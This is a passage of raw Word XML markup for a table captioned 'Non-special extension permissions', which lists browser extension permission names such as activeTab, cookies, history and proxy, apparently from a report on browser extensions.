        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="120" w:name="_Ref514844192"/>
      <w:bookmarkStart w:id="121" w:name="_Toc523071590"/>
      <w:r w:rsidRPr="009A14F1">
        <w:rPr>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r w:rsidR="00F5383F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F5383F" w:rsidRPr="009A14F1">
        <w:rPr>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F5383F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00F5383F">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009A14F1">
        <w:rPr>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t>: “Non-special” extension permissions.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="120"/>
      <w:bookmarkEnd w:id="121"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2264"/>
        <w:gridCol w:w="2350"/>
        <w:gridCol w:w="2273"/>
        <w:gridCol w:w="2458"/>
      </w:tblGrid>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="5E7B69CD" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1852691C" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>activeTab</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2C9719C9" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>declarativeContent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3BC4F9DA" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>notifications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0EB20521" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.storage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="7107D9FB" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F96BAC2" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>alarms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="148783CA" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>desctopCapture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2DD791A9" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>pageCapture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="41FBB97D" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>tabCapture</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="5581D459" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="55426FC3" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>background</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="70C67629" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>downloads</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="08AFF96F" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>power</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6200D896" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>tabs</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="12188E31" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="70BC3CB6" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>bookmarks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0071FEEB" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>fontSettings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="304D26F5" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>printerProvider</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1ADC5794" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>topSites</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="3C374F84" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="53139939" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>browsingData</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31E9F05E" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>gcm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="76B72168" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>privacy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6A899C1F" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>tts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="77E4F89A" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="30F25744" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>clipboardRead</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5C0A9D26" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>geolocation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1E3BA5A8" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>proxy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="714ED241" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>ttsEngine</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="0964EFB1" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="262228DA" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>clipboardWrite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0786053F" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>history</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3B83F164" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>sessions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4FD06950" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>unlimitedStorage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="7FE39CCC" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="004C13AD" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>contentSettings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="019B7412" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>identity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="43C08E10" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>storage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4D16D484" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>webNavigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="4280C992" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5A033DF0" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>contextMenus</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="496BF588" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>idle</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4DB737F9" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.cpu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="08EB35EF" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>web.request</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="45920EF5" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="61C1C545" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>cookies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="61B9E319" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>management</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="334A19AA" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.display</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3CC75198" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
